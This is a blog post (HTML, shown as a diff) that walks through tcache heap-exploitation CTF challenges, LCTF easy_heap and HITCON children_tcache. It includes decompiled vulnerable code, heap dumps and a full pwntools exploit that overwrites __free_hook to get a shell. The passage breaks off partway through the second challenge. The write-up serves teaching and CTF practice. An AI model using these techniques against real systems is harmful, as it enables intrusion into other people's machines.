@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>Tcache利用总结 | V1NKe的心情垃圾桶</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="PWN," />
+  
+
+  <meta name="description" content="Tcache">
+<meta name="keywords" content="PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tcache利用总结">
+<meta property="og:url" content="http://yoursite.com/2019/02/24/tcache利用总结/index.html">
+<meta property="og:site_name" content="V1NKe的心情垃圾桶">
+<meta property="og:description" content="Tcache">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-03-02T15:33:35.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Tcache利用总结">
+<meta name="twitter:description" content="Tcache">
+
+  
+
+  
+    <link rel="icon" href="/haimian.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文："><span class="toc-text">正文：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2018-LCTF-easy-heap："><span class="toc-text">2018 LCTF easy_heap：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP："><span class="toc-text">EXP：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2018-HITCON-children-tcache："><span class="toc-text">2018 HITCON children_tcache：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP：-1"><span class="toc-text">EXP：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2018-HITCON-baby-tcache："><span class="toc-text">2018 HITCON baby_tcache：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-text">总结：</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-tcache利用总结" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">Tcache利用总结</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2019.02.24</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>V1NKe</span>
+        </span>
+      
+
+      
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>开学前一天正式进入学习状态，还是蛮不错的这种感觉，就好像是高中别人都在学习自己却在贪玩的焦虑感一下子就没了，哈哈哈。不过自己的效率还是得提高一些。假期说要补上的债一样都没还上，真烦。现在开始填坑了。</p>
+<h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><h3 id="2018-LCTF-easy-heap："><a href="#2018-LCTF-easy-heap：" class="headerlink" title="2018 LCTF easy_heap："></a>2018 LCTF easy_heap：</h3><p>一道关于<code>tcache</code>的利用题，也是之前打<code>LCTF</code>的第一题，现在来看一看。</p>
+<p>试试程序发现是常规的堆题。</p>
+<p>来看看伪代码：</p>
+<p>漏洞主要就出在创建堆函数中，存在一个<code>null-byte-one</code>漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_BEC(_BYTE *a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v3; // [rsp+14h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v4; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(0x28u);</span><br><span class="line">  v3 = 0;</span><br><span class="line">  if ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      read(0, &amp;a1[v3], 1uLL);</span><br><span class="line">      if ( a2 - 1 &lt; v3 || !a1[v3] || a1[v3] == 10 )</span><br><span class="line">        break;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    a1[v3] = 0;</span><br><span class="line">    a1[a2] = 0;                                 // null by one</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    *a1 = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一般情况下，遇到<code>null-byte-one</code>我们都会选择用<code>overlapping</code>。但是这里所分配的堆块是固定0x100大小的，不能更改，所以说我们无法构造出我们想要的堆块来利用<code>overlapping</code>，那么我们换种思路，既然这里选择的是最新版用上<code>tcache</code>机制的libc，那么我们便来利用上他的一些机制。利用<code>unsort bin</code>来构造攻击，首先先分配满十个堆块：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for i in range(10):</span><br><span class="line">    create(0xf8,&apos;A&apos;*0xf0)</span><br></pre></td></tr></table></figure>
+<p>然后delete掉十个，七个进cache，三个进unseat bin当中，这里delete需要交错delete，方便实现之后的unlink：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">delete(1)</span><br><span class="line">delete(3)</span><br><span class="line">for i in range(5,10):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(0)</span><br><span class="line">delete(2)</span><br><span class="line">delete(4)</span><br></pre></td></tr></table></figure>
+<p>然后我们再分配掉七个tcache bin，分配前两个unsort bin并且其中一个用上<code>null-byte-one</code>漏洞，此时的堆块情况就是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">0x55b13d397300:	0x0000000000000000	0x0000000000000101  --&gt; 最后一块没create的unsort bin堆块</span><br><span class="line">0x55b13d397310:	0x0000000000000000	0x000055b13d397500</span><br><span class="line">0x55b13d397320:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397330:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397340:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397350:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397360:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397370:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397380:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397390:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3973a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3973b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3973c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3973d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3973e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3973f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397400:	0x0000000000000100	0x0000000000000101</span><br><span class="line">0x55b13d397410:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397420:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397430:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397440:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397450:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397460:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397470:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397480:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397490:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3974a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3974b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3974c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3974d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3974e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3974f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397500:	0x0000000000000000	0x0000000000000101  --&gt; 此时堆块是在使用的</span><br><span class="line">0x55b13d397510:	0x000055b13d397300	0x000055b13d397700</span><br><span class="line">0x55b13d397520:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397530:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397540:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397550:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397560:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397570:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397580:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397590:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3975a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3975b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3975c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3975d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3975e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3975f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397600:	0x0000000000000100	0x0000000000000100  --&gt; 用上了&apos;n-b-o&apos;</span><br><span class="line">0x55b13d397610:	0x000055b13d397400	0x0000000000000000</span><br><span class="line">0x55b13d397620:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397630:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397640:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397650:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397660:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397670:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397690:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3976a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3976b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3976c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3976d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3976e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3976f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397700:	0x0000000000000000	0x0000000000000101</span><br><span class="line">0x55b13d397710:	0x000055b13d397500	0x00007f384a260ca0</span><br><span class="line">0x55b13d397720:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397730:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397740:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397750:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397760:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397770:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397780:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d397790:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b13d3977a0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>这里需要注意的一个点就是，当分配第一个unsort bin中的堆块时，会将unsort bin中的堆块放到tcache当中去，所以后面需要将tcache填满时只需填上6个即可。</p>
+<p>然后再利用<code>null-byte-one</code>实现unlink。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(5)</span><br></pre></td></tr></table></figure>
+<p>这样我们可以泄漏出libc地址，而且有两个指针指向同一个堆块，可以free掉两次，实现tcache dup。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#泄漏libc地址：</span><br><span class="line">for i in range(9) :</span><br><span class="line">    p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">data = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line"></span><br><span class="line">libc_base = data - 4111520</span><br><span class="line">log.success(&apos;libc base is :&apos;+hex(libc_base))</span><br><span class="line">free_hook = libc_base + 4118760</span><br><span class="line">one_gadget = libc_base + 0x4f322</span><br><span class="line">log.success(&apos;free hook is :&apos;+hex(free_hook))</span><br></pre></td></tr></table></figure>
+<p>因为程序开了<code>Full RELRO</code>，所以这里就修改<code>__free_hook</code>成<code>one_gadget</code>来getshell。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">for i in range(7) :</span><br><span class="line">    create(0xf0,&apos;\n&apos;)</span><br><span class="line">create(0xf0,&apos;\n&apos;)</span><br><span class="line">delete(0) #空出一个位置来为后面做准备</span><br><span class="line">delete(8)</span><br><span class="line">delete(9)</span><br><span class="line">create(0xf0,p64(free_hook))</span><br><span class="line">create(0xf0,p64(free_hook)) tcache指向了free_hook</span><br><span class="line">create(0xf0,p64(one_gadget)) 修改为one_gadget</span><br><span class="line"></span><br><span class="line">delete(1) #触发</span><br></pre></td></tr></table></figure>
+<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./easy_heap&apos;)</span><br><span class="line">libc = ELF(&apos;easy_heap&apos;)</span><br><span class="line">elf = ELF(&apos;./libc64.so&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def create(size,content) :</span><br><span class="line">    p.sendlineafter(&apos;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">    p.sendlineafter(&apos;&gt; &apos;,str(size))</span><br><span class="line">    p.sendlineafter(&apos;&gt; &apos;,content)</span><br><span class="line"></span><br><span class="line">def show(index) :</span><br><span class="line">    p.sendlineafter(&apos;&gt; &apos;,&apos;3&apos;)</span><br><span class="line">    p.sendlineafter(&apos;&gt; &apos;,str(index))</span><br><span class="line"></span><br><span class="line">def delete(index) :</span><br><span class="line">    p.sendlineafter(&apos;&gt; &apos;,&apos;2&apos;)</span><br><span class="line">    p.sendlineafter(&apos;&gt; &apos;,str(index))</span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">    create(0xf8,&apos;A&apos;*0xf0)</span><br><span class="line">delete(1)</span><br><span class="line">delete(3)</span><br><span class="line">for i in range(5,10):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(0)</span><br><span class="line">delete(2)</span><br><span class="line">delete(4)</span><br><span class="line"></span><br><span class="line">for i in range(7) :</span><br><span class="line">    create(0xf0,&apos;\n&apos;)</span><br><span class="line">create(0xf0,&apos;\n&apos;)</span><br><span class="line">create(0xf8,&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(5) :</span><br><span class="line">    delete(i)</span><br><span class="line">delete(6)</span><br><span class="line">delete(5)</span><br><span class="line"></span><br><span class="line">show(8)</span><br><span class="line">for i in range(9) :</span><br><span class="line">    p.recvuntil(&apos;&gt; &apos;)    #此处不太准确，根据自己环境自行修改</span><br><span class="line">data = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line"></span><br><span class="line">libc_base = data - 4111520</span><br><span class="line">log.success(&apos;libc base is :&apos;+hex(libc_base))</span><br><span class="line">free_hook = libc_base + 4118760</span><br><span class="line">one_gadget = libc_base + 0x4f322</span><br><span class="line">log.success(&apos;free hook is :&apos;+hex(free_hook))</span><br><span class="line"></span><br><span class="line">for i in range(7) :</span><br><span class="line">    create(0xf0,&apos;\n&apos;)</span><br><span class="line">create(0xf0,&apos;\n&apos;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(8)</span><br><span class="line">delete(9)</span><br><span class="line">create(0xf0,p64(free_hook))</span><br><span class="line">create(0xf0,p64(free_hook))</span><br><span class="line">create(0xf0,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="2018-HITCON-children-tcache："><a href="#2018-HITCON-children-tcache：" class="headerlink" title="2018 HITCON children_tcache："></a>2018 HITCON children_tcache：</h3><p>这也是一道常规题，看一下伪代码可以发现也是只有一个<code>null-byte-one</code>漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 create()</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; // [rsp+Ch] [rbp-2034h]</span><br><span class="line">  char *dest; // [rsp+10h] [rbp-2030h]</span><br><span class="line">  unsigned __int64 size; // [rsp+18h] [rbp-2028h]</span><br><span class="line">  char s; // [rsp+20h] [rbp-2020h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+2038h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  memset(&amp;s, 0, 0x2010uLL);</span><br><span class="line">  for ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( i &gt; 9 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;:(&quot;);</span><br><span class="line">      return __readfsqword(0x28u) ^ v5;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !qword_202060[i] )</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Size:&quot;);</span><br><span class="line">  size = sub_B67();</span><br><span class="line">  if ( size &gt; 0x2000 )                          // size &lt; 0x2000</span><br><span class="line">    exit(-2);</span><br><span class="line">  dest = malloc(size);</span><br><span class="line">  if ( !dest )</span><br><span class="line">    exit(-1);</span><br><span class="line">  printf(&quot;Data:&quot;);</span><br><span class="line">  sub_BC8(&amp;s, size);</span><br><span class="line">  strcpy(dest, &amp;s);                             // off by one</span><br><span class="line">  qword_202060[i] = dest;</span><br><span class="line">  qword_2020C0[i] = size;</span><br><span class="line">  return __readfsqword(0x28u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里size在范围内是由自己选择的，所以说比上面那一题简单一些，跟上面那一题的思路一样，利用unlink来解决问题，首先构造一个大于0x408的堆块来避免tcache机制，再构造一个在tcache机制中的chunk，再构造一个大于0x408的chunk来避免tcache，以此unlink的时候可以不被tcache影响，此时：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(0x500, &apos;a&apos; * 0x4ff)</span><br><span class="line">create(0x68, &apos;b&apos; * 0x67)</span><br><span class="line">create(0x5f0, &apos;c&apos; * 0x5ef)</span><br><span class="line">create(0x20, &apos;d&apos; * 0x20) --&gt;避免合并top chunk</span><br></pre></td></tr></table></figure>
+<p>这时候的堆块情况为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-----------------</span><br><span class="line">|   0x511       |</span><br><span class="line">|               |</span><br><span class="line">-----------------</span><br><span class="line">|   0x71        |</span><br><span class="line">|               |</span><br><span class="line">-----------------</span><br><span class="line">|   0x601       |</span><br><span class="line">|               |</span><br><span class="line">-----------------</span><br></pre></td></tr></table></figure>
+<p>利用<code>null-byte-one</code>将0x601变为0x600以此来unlink：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for i in range(9):</span><br><span class="line">    create(0x68 - i, &apos;b&apos; * (0x68 - i))</span><br><span class="line">    delete(0)</span><br><span class="line">create(0x68,&apos;b&apos;*0x60+p64(0x580))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">delete(2)</span><br></pre></td></tr></table></figure>
+<p>unlink后得到了一个0xb81的chunk，包括了以上三个chunk，但是其中chunk2还是有指针的，所以就能够堆块重用，使得两个指针指向chunk2，先malloc一个0x508的chunk，此时就可以leak出libc地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create(0x508,&apos;a&apos;*0x507)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">show(0)</span><br></pre></td></tr></table></figure>
+<p>此时原本的chunk2变成了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0x55747df85760</span><br><span class="line">0x55747df85760:	0x0061616161616161	0x0000000000000671</span><br><span class="line">0x55747df85770:	0x00007fdb58b5fca0	0x00007fdb58b5fca0</span><br><span class="line">0x55747df85780:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>所以在此malloc一个0x68大小的chunk2，就可以实现cache dup，之后就常规操作了，改变malloc地址为one_gadget的地址，实现getshell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create(0x68,p64(malloc_addr)+0x5f*&apos;a&apos;)</span><br><span class="line">create(0x68,&apos;a&apos;*0x67)</span><br><span class="line">create(0x68,p64(one_addr))</span><br></pre></td></tr></table></figure>
